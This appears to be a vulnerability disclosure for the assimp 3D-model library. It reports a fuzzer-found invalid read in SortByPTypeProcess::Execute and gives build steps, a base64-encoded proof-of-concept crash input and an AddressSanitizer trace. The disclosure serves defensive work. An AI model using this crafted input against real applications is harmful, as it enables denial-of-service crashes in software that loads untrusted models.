| Affected Projects assimp v5.4.3 (<https://github.com/assimp/assimp>) Problem Type CWE-122: Heap-based Buffer Overflow DecriptionSummary A segmentation fault (SEGV) was detected in the `SortByPTypeProcess::Execute` function in the Assimp library during fuzz testing with AddressSanitizer. The crash occurred due to a read access to an invalid memory address (`0x1000c9714971`). This error indicates a potential null pointer dereference or an out-of-bounds memory access. Details The segmentation fault occurs within the `SortByPTypeProcess::Execute` function at line 175 in the file `SortByPTypeProcess.cpp`. The invalid memory access arises when the function tries to read from an address that it is not allowed to, causing the program to crash. The crash is triggered when processing certain malformed input files during the post-processing step, specifically when attempting to sort meshes by primitive type.  The crash can be reproduced by running the fuzzer with an input that triggers the faulty post-processing logic. The stack trace indicates that the bug is located within the execution of post-processing steps in the Assimp library, likely related to improper handling of scene data or mesh structures. PoCSteps to reproduce:  1. Clone the Assimp repository and build it using the following commands:    ```    cmake CMakeLists.txt -G "Ninja" -DBUILD_SHARED_LIBS=OFF -DASSIMP_BUILD_ZLIB=ON \                        -DASSIMP_BUILD_TESTS=OFF -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \                        -DASSIMP_BUILD_SAMPLES=OFF    cmake --build .    ``` 2. Compile the fuzzer:    ```    clang -fsanitize=address,fuzzer -std=c++11 -Iinclude fuzz/assimp_fuzzer.cc -o assimp_fuzzer ./lib/libassimp.a ./contrib/zlib/libzlibstatic.a    ``` 3. Run the fuzzer to trigger the segmentation fault:    ```    $ echo -n TFdNTw1Mb2FkT2JqZWN0ICQkJF9fX21hZ2ljX19fJCQk86CBsC7PMk9iLy5uZmYNTPOggZkxxQ3GyAzMDQ0NdHBwCSo2NTUzNic2MjkzMDcwNDQ0NjM5ODQ2Nzc5MzEzNzpmKk1BUF9DTEFqTElHSFRfQ09PYi8ubmZmDUzzoIGZMcUNxsgMzA0NDXRwcAkJMzEwNzInNjI5MzA3MDQ0NDYzOTg0NjfKys4= | base64 -d > poc    & ./assimp_fuzzer poc    ```        The invalid read access will cause AddressSanitizer to report a segmentation fault during the execution of the post-processing logic.  Impact This vulnerability could lead to denial of service (DoS) when processing crafted input files with the Assimp library. A maliciously crafted 3D model file can trigger this segmentation fault, causing the application to crash. The root cause likely lies in improper handling of scene or mesh data during post-processing, leading to an invalid memory access.  Maintainers should investigate the faulty logic in the `SortByPTypeProcess::Execute` function and ensure proper bounds checking and memory management to prevent segmentation faults during post-processing.  ``` ================================================================= ==2341721==ERROR: AddressSanitizer: SEGV on unknown address 0x1000c9714971 (pc 0x559f369106c2 bp 0x7ffe4b8e5140 sp 0x7ffe4b8e4840 T0) ==2341721==The signal is caused by a READ memory access.     #0 0x559f369106c2 in Assimp::SortByPTypeProcess::Execute(aiScene*) /root/assimp/code/PostProcessing/SortByPTypeProcess.cpp:175:60     #1 0x559f3687320e in Assimp::BaseProcess::ExecuteOnScene(Assimp::Importer*) /root/assimp/code/Common/BaseProcess.cpp:82:16     #2 0x559f3573b0f3 in Assimp::Importer::ApplyPostProcessing(unsigned int) /root/assimp/code/Common/Importer.cpp:841:37     #3 0x559f357399ec in Assimp::Importer::ReadFile(char const*, unsigned int) /root/assimp/code/Common/Importer.cpp:751:32     #4 0x559f357369ba in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) /root/assimp/code/Common/Importer.cpp:507:17     #5 0x559f356df5a2 in LLVMFuzzerTestOneInput /root/assimp/fuzz/assimp_fuzzer.cc:54:34     #6 0x559f35607fe3 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/root/assimp/assimp_fuzzer+0x2b7fe3) (BuildId: 1e711185241dbbad7a4754eda884118921b05a3a)     #7 0x559f355f1d5f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/root/assimp/assimp_fuzzer+0x2a1d5f) (BuildId: 1e711185241dbbad7a4754eda884118921b05a3a)     #8 0x559f355f7ab6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/root/assimp/assimp_fuzzer+0x2a7ab6) (BuildId: 1e711185241dbbad7a4754eda884118921b05a3a)     #9 0x559f356218d2 in main (/root/assimp/assimp_fuzzer+0x2d18d2) (BuildId: 1e711185241dbbad7a4754eda884118921b05a3a)     #10 0x7f3cccc6cd8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16     #11 0x7f3cccc6ce3f in __libc_start_main csu/../csu/libc-start.c:392:3     #12 0x559f355ec624 in _start (/root/assimp/assimp_fuzzer+0x29c624) (BuildId: 1e711185241dbbad7a4754eda884118921b05a3a)  AddressSanitizer can not provide additional info.
